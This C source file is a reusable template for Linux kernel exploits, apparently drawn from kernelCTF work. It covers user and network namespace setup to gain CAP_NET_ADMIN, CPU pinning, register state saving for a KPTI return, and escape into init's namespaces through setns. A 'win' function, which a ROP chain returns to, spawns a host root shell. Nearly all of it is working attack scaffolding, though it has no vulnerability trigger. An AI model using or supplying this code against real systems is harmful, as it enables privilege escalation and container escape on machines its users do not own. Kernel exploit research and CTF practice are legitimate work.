/*
 * Namespace Setup and Escape Template
 *
 * Extracted from kernelCTF exploits. Most kernel exploits targeting
 * netfilter/net_sched need CAP_NET_ADMIN, obtained via user namespaces.
 *
 * Setup flow:
 *   1. unshare(CLONE_NEWUSER | CLONE_NEWNET) - create new user + net NS
 *   2. Map UID/GID - become root in the new namespace
 *   3. Exploit runs with CAP_NET_ADMIN in isolated context
 *
 * Escape flow (after gaining real root via ROP/write):
 *   1. setns() to /proc/1/ns/* - join init's namespaces
 *   2. Or switch_task_namespaces() via ROP
 *   3. execve("/bin/sh") - root shell in host context
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

/* ============================================================
 * Namespace Setup
 * ============================================================ */

static void write_file(const char *path, const char *content) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) {
        perror(path);
        return;
    }
    write(fd, content, strlen(content));
    close(fd);
}

/* Standard namespace setup for CAP_NET_ADMIN exploits */
void setup_namespaces(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buf[256];

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("unshare");
        exit(1);
    }

    /* Deny setgroups (required before writing gid_map as non-root) */
    write_file("/proc/self/setgroups", "deny");

    /* Map current user to root in the new namespace */
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buf);

    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buf);
}

/* Full namespace isolation (user + net + mount) */
void setup_full_namespaces(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buf[256];

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS) < 0) {
        perror("unshare");
        exit(1);
    }

    write_file("/proc/self/setgroups", "deny");

    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buf);

    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buf);
}

/* ============================================================
 * CPU Affinity Pinning
 * ============================================================ */

#include <sched.h>

void pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) {
        perror("sched_setaffinity");
    }
}

/* ============================================================
 * State Save for KPTI Return
 * ============================================================ */

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(void) {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
    );
}

/* ============================================================
 * Namespace Escape (After Privilege Escalation)
 * ============================================================ */

/* Escape from namespace to host context (requires real root) */
void escape_namespaces(void) {
    int fd;

    fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (fd >= 0) { setns(fd, CLONE_NEWNS); close(fd); }

    fd = open("/proc/1/ns/pid", O_RDONLY);
    if (fd >= 0) { setns(fd, 0); close(fd); }

    fd = open("/proc/1/ns/net", O_RDONLY);
    if (fd >= 0) { setns(fd, CLONE_NEWNET); close(fd); }
}

/* Win function - ROP chain returns here */
void win(void) {
    if (getuid() == 0) {
        printf("[+] Got root! uid=%d\n", getuid());
        escape_namespaces();
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }
    printf("[-] Exploit failed, uid=%d\n", getuid());
    exit(1);
}

/* ============================================================
 * Worker Thread Synchronization
 * ============================================================ */

#include <stdatomic.h>
#include <sys/mman.h>

struct sync_state {
    atomic_int phase;
};

struct sync_state *sync_init(void) {
    struct sync_state *s = mmap(NULL, sizeof(*s),
        PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    atomic_store(&s->phase, 0);
    return s;
}

void sync_wait(struct sync_state *s, int expected) {
    while (atomic_load(&s->phase) != expected) {
        usleep(100);
    }
}

void sync_advance(struct sync_state *s) {
    atomic_fetch_add(&s->phase, 1);
}
